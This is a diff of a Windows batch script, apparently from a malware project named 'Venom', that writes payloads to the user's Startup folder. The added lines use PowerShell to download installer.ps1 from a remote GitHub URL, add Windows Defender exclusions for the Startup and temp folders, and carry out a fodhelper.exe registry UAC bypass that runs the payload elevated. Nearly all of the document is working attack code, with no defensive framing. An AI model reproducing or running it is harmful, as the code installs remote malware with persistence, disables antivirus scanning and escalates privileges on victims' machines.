@@ -16,13 +16,24 @@ cd %STARTUP%
 
 @REM write payloads to startup
 
-powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"
+@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"
 
-powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/uac1.vbs -OutFile uac1.vbs"
+@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/uac1.vbs -OutFile uac1.vbs"
+powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
+
+
+@echo off
+REM Modify the registry to set the command to run with elevated privileges
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powershell -Command \"installer.ps1\"" /f
+
+REM Run fodhelper.exe to trigger the elevated command
+start fodhelper.exe
+
+
 
 
 @REM run payload
-powershell ./wget.cmd; ./uac1
+@rem powershell ./wget.cmd; ./uac1
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
